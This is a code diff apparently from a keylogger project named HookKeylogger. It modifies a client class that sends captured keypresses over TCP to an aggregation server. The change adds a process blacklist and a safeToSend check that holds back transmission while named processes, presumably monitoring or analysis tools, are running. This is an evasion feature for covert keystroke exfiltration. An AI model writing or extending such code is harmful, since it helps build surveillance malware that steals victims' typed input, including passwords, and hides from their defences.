@@ -1,16 +1,12 @@
 ﻿using Google.Protobuf;
 using HookKeylogger.AggergationServer.Types;
-using HookKeylogger.Base;
-using System;
 using System.Collections.Concurrent;
-using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
-using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
 
 namespace KeypressAggregator
 {
@@ -41,7 +37,9 @@ namespace KeypressAggregator
         private int bufSize;
         private TcpClient client;
 
-        public ServerClient(string addr, int port)
+        private string[] blacklistProcess;
+
+        public ServerClient(string addr, int port, string[] blacklist)
         {
             this.inq = new ConcurrentQueue<CI>();
             this.buffer = new ConcurrentQueue<CI>();
@@ -49,6 +47,7 @@ namespace KeypressAggregator
             this.port = port;
             this.bufSize = 10;
             this.client = new TcpClient(addr, port);
+            this.blacklistProcess = blacklist;
         }
 
         /// <summary>
@@ -92,12 +91,30 @@ namespace KeypressAggregator
             }
         }
 
+        private bool safeToSend()
+        {
+            // Check each of the blacklisted processes, if the process is present don't send.
+            foreach(string name in blacklistProcess)
+            {
+                if (Process.GetProcessesByName(name).Length != 0)
+                {
+                    return false;
+                }
+            }
+            return true;
+        }
+
         /// <summary>
         /// Send the buffer to the server.
         /// </summary>
         private void send()
         {
             if (!connect())
+            {
+                return;
+            }
+
+            if (!safeToSend())
             {
                 return;
             }
